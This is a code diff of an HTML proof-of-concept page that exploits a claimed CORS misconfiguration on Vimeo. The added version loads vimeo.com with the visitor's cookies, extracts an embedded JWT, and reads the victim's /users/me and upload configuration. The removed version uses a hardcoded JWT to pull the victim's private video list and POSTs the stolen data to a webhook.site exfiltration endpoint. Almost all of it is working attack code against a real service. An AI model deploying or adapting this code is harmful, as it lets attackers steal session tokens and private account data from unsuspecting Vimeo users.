@@ -1,60 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Vimeo CORS PoC</title>
+  <meta charset="UTF-8">
+  <title>Vimeo CORS Misconfiguration PoC</title>
 </head>
 <body>
   <h1>Vimeo CORS Misconfiguration PoC</h1>
   <pre id="output">Loading...</pre>
 
   <script>
-    const exfil = "https://webhook.site/YOUR-UUID"; // Replace with your webhook endpoint
-    const attackerJwt = "jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTU4NjkxNjAsInVzZXJfaWQiOjI0NDk0MzYzNSwiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiYjhmYzkwM2EtYzc2OC00ODU4LWJlOTctZTJhYThiOGJmZWYxIiwic2giOiJhZDgyYTY4ZTRlMGZiY2U0NjgyM2I0NTM5ZmFkMjNkYzI1NjhiNDY5YjQ4NjU2MjFkNDcyMzA0YTY4ZjMxNWE0In0.3FM0VAy2V6w2QjA3-CEit_txZK1z97yr1k3BEo4oP2Y";  
+    async function runPoC() {
+      const output = document.getElementById("output");
 
-    // Step 1: Call /upload/config with attacker's known JWT
-    fetch("https://api.vimeo.com/upload/config", {
-      credentials: "include",
-      headers: {
-        "Authorization": attackerJwt
+      try {
+        // Step 1: Fetch Vimeo homepage with cookies
+        output.textContent = "[*] Fetching Vimeo homepage…";
+        const homepage = await fetch("https://vimeo.com/", { credentials: "include" });
+        const html = await homepage.text();
+
+        // Step 2: Extract JWT embedded in the page
+        const jwtMatch = html.match(/"jwt"\s*:\s*"([^"]+)"/);
+        if (!jwtMatch) {
+          output.textContent = "[!] Could not find JWT in homepage source";
+          return;
+        }
+        const jwt = jwtMatch[1];
+        output.textContent = "[+] Extracted JWT:\n" + jwt + "\n\n";
+
+        // Step 3: Call /users/me with the stolen JWT
+        output.textContent += "[*] Fetching /users/me with JWT…\n";
+        const meResp = await fetch("https://api.vimeo.com/users/me", {
+          headers: { "Authorization": "jwt " + jwt }
+        });
+        const meData = await meResp.json();
+
+        output.textContent += "[+] Account data:\n" + JSON.stringify(meData, null, 2) + "\n\n";
+
+        // Step 4: (Optional) call /upload/config for completeness
+        output.textContent += "[*] Fetching /upload/config with JWT…\n";
+        const configResp = await fetch("https://api.vimeo.com/upload/config", {
+          headers: { "Authorization": "jwt " + jwt }
+        });
+        const configData = await configResp.json();
+
+        output.textContent += "[+] Upload config:\n" + JSON.stringify(configData, null, 2);
+
+      } catch (err) {
+        output.textContent = "[!] Error: " + err;
       }
-    })
-      .then(r => r.json())
-      .then(configData => {
-        document.getElementById("output").innerText = "Stolen /upload/config:\n" + JSON.stringify(configData, null, 2);
+    }
 
-        // Exfil stolen config
-        fetch(exfil, {
-          method: "POST",
-          body: JSON.stringify({ stolen_config: configData }),
-          headers: { "Content-Type": "application/json" }
-        });
-
-        // Grab the main JWT from the response
-        const stolenJwt = configData?.api?.jwt;
-        if (!stolenJwt) throw new Error("No JWT found in /upload/config response");
-
-        // Step 2: Use stolen JWT against the sensitive /users/{id}/videos endpoint
-        const videosEndpoint =
-          "https://api.vimeo.com/users/244943635/videos?per_page=10&page=1&sizes=270x152%2C300x169&sort=last_user_action_event_date&filter=nolive&fields=download.codec,download.rendition,download.created_time,download.expires,download.fps,download.height,download.link,download.public_name,download.quality,download.size,download.size_short,download.source_link,download.type,download.video_file_id,download.width,duration,parent_project.uri,parent_project.is_private_to_user,last_user_action_event_date,manage_link,name,pictures.sizes.link,release_time,privacy.view,privacy.download,user.link,user.name,user.pictures,user.upload_quota,user.uri,embed,uri,link,can_move_to_project,review_page.link,metadata.can_be_replaced,metadata.interactions.delete,metadata.interactions.edit,metadata.interactions.invite,metadata.interactions.legal_hold.uri";
-
-        return fetch(videosEndpoint, {
-          headers: { "Authorization": "jwt " + stolenJwt }
-        });
-      })
-      .then(r => r.json())
-      .then(videosData => {
-        document.getElementById("output").innerText += "\n\nVictim's Videos:\n" + JSON.stringify(videosData, null, 2);
-
-        // Exfil victim's video list
-        fetch(exfil, {
-          method: "POST",
-          body: JSON.stringify({ victim_videos: videosData }),
-          headers: { "Content-Type": "application/json" }
-        });
-      })
-      .catch(err => {
-        document.getElementById("output").innerText = "Error: " + err;
-      });
+    runPoC();
   </script>
 </body>
 </html>
